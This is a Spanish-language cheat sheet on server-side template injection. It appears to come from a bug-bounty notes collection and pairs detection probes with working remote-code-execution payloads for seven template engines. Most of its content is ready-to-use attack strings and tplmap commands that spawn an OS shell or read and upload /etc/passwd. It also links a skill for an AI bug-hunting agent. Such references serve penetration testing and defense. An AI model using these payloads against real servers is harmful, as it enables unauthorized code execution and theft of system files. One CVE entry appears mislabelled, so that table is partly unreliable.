---
title: "SSTI — Server-Side Template Injection"
description: "SSTI ocurre cuando input del usuario se inserta en una plantilla del lado del servidor y es evaluada como código."
category: "Web"
date: 2026-07-18
---
# 🧩 SSTI — Server-Side Template Injection

SSTI ocurre cuando input del usuario se inserta en una plantilla del lado del servidor y es evaluada como código. Resultado: **RCE completo** en la mayoría de los motores.

## Detección

### Probar especiales de template

```
${{<%[%'"}}%\.
{{7*7}}
${7*7}
<%= 7*7 %>
{{7*'7'}}
```

- `{{7*7}}` → `49` en Jinja2/Twig/Nunjucks
- `${7*7}` → `49` en Freemarker/Velocity
- `<%= 7*7 %>` → `49` en ERB (Ruby)

### Fuzzing con qsreplace + ffuf

```bash
waybackurls http://target.com | qsreplace "ssti{{9*9}}" > fuzz.txt
ffuf -u FUZZ -w fuzz.txt -replay-proxy http://127.0.0.1:8080/
```

## Explotación por motor

### Jinja2 (Python/Flask)

```jinja2
# Detección
{{7*7}}

# RCE
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}

# Blind
{% if "".__class__.__mro__[1].__subclasses__()[X]("id") %}yes{% endif %}
```

### Twig (PHP/Symfony)

```twig
# Detección
{{7*7}}

# RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|map('system')}}
{{['cat /etc/passwd']|filter('system')}}
```

### Smarty (PHP)

```smarty
# Detección
{7*7}

# RCE
{php}echo `id`;{/php}
{$smarty.template_object->smarty->disableSecurity()}
{php}system('id');{/php}
```

### Freemarker (Java)

```freemarker
# Detección
${7*7}

# RCE
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### Velocity (Java)

```velocity
# Detección
#set($x=7*7)$x

# RCE
#set($e=$class.inspect("java.lang.Runtime").getMethod("exec","".class))
$e.invoke($runtime.getRuntime(),"id")
```

### ERB (Ruby/Rails)

```erb
# Detección
<%= 7*7 %>

# RCE
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read() %>
```

### Handlebars (Node.js)

```handlebars
# Detección
{{7*7}}

# RCE (con prototype pollution)
{{this.__proto__.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}
```

## Herramientas

```bash
# Tplmap — detección y explotación automática
tplmap.py -u 'http://target.com/page?name=John' --os-shell
tplmap.py -u 'http://target.com/page?name=John' --upload /etc/passwd --upload-remotepath /tmp/passwd

# SSTImap (fork moderno)
sstimap.py -u 'http://target.com/page?name=John'
```

## CVEs recientes

| CVE | Año | Motor | Descripción |
|-----|-----|-------|-------------|
| CVE-2025-23211 | 2025 | Jinja2 | Tandoor Recipes RCE (CVSS 9.9) |
| CVE-2024-29686 | 2024 | Winter CMS | SSTI authenticated |
| CVE-2024-22722 | 2024 | Form Tools | SSTI RCE |
| CVE-2024-23897 | 2024 | Jenkins | Arbitrary file read → SSTI |

## Relacionado
- **File Upload** — SSTI via file upload (CVE-2025-23211)
- **LFI RFI Path Traversal** — log poisoning → SSTI → RCE
- **Metodologia Bug Bounty**
- **NoSQL Injection** — $where RCE comparte clase de inyección
- **SSRF** — blind SSTI detection via OOB
- **XSS y bypass CSP** — SSTI puede generar XSS reflejado
- **Claude-BugHunter** (skill `hunt-ssti`)
